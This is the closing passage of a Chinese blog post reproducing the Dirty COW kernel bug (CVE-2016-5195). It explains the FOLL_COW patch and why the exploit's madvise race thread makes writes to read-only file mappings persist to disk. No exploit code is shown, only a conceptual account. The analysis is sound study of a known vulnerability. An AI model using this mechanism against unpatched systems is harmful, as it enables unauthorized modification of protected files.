<h1 id="3-修復"><a href="#3-修復" class="headerlink" title="3.修復"></a>3.修復</h1><p><a target="_blank" rel="noopener" href="https://bugzilla.suse.com/attachment.cgi?id=697810&action=diff">Dirty Cow 補丁</a></p>
<p>這裏添加了名爲 <code>FOLL_COW</code>的新標識爲，使得我們在調用 <code>do_wp_fault</code>函數之後會使得他並不清除掉 <code>FOLL_WRITE</code>位，而是新增一個標記爲 <code>FOLL_COW</code>用來標識該頁面是一個COW頁，這樣就可以使得我們之後不會以讀的請求來調用 <code>faultin_page</code>函數</p>
<p>有同學或許可能有疑問，既然我們的 <code>/proc/self/mem</code>函數已經可以寫入進程所映射到的可讀空間了，那爲什麼還要第二各madvise線程呢，這是因爲雖然我們可以確實修改進程當中所映射到的文件物理內存，但這個物理內存是通過COW獲取道德新物理內存，他並不會再寫回到文件系統，而是隨着進程運行完畢而消失～ ，而調用第二個線程可以使得我們直接操作page cache當中直接映射到的文件頁面，並且由於kmap自動爲內核頁表項帶上RD&#x2F;WR位和dirty位，這使得在之後的同步階段會將這個物理地址寫回到磁盤</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/PWN/">#PWN</a>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Kernel/">#Kernel</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2016-5195漏洞复现</div>
      <div>https://peiandhao.github.io/2024/01/07/CVE-2016-5195/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>peiwithhao</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年1月7日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/10/10/CVE-2022-0185/" title="CVE-2022-0185漏洞复现">
                        <span class="hidden-mobile">CVE-2022-0185漏洞复现</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","appKey":"Vr60qrZIptqhJaXqWvDEknkH","path":"window.location.pathname","placeholder":"锐评一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Pei</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hao</span></a> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
